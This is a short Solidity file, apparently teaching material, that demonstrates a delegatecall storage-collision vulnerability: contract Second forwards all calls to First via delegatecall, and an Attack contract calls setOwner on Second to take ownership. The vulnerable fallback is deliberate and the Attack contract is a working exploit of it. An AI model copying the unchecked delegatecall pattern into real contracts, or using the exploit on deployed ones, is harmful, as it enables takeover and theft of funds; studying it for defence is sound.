// SPDX-License-Identifier: MIT
// Author: Yaghoub Adelzadeh
// GitHub: https://www.github.com/dappteacher

pragma solidity ^0.8.20;

// Contract First
// Simple contract to set an owner address.
contract First {
    address public owner;

    // Function to set the owner address to the caller's address.
    function setOwner() public {
        owner = msg.sender;
    }
}

// Contract Second
// Contract that interacts with contract First using delegatecall.
contract Second {
    address public owner;
    First public first;

    // Constructor to set the address of contract First.
    constructor(First _first) {
        first = First(_first);
    }

    // Fallback function to delegate calls to contract First.
    fallback() external payable {
        address(first).delegatecall(msg.data);
    }
}

// Contract Attack
// Contract to demonstrate an attack by calling setOwner on contract Second.
contract Attack {
    address public second;

    // Constructor to set the address of contract Second.
    constructor(address _second) {
        second = _second;
    }

    // Function to perform the attack by calling setOwner on contract Second.
    function attack() public {
        second.call(abi.encodeWithSignature("setOwner()"));
    }
}
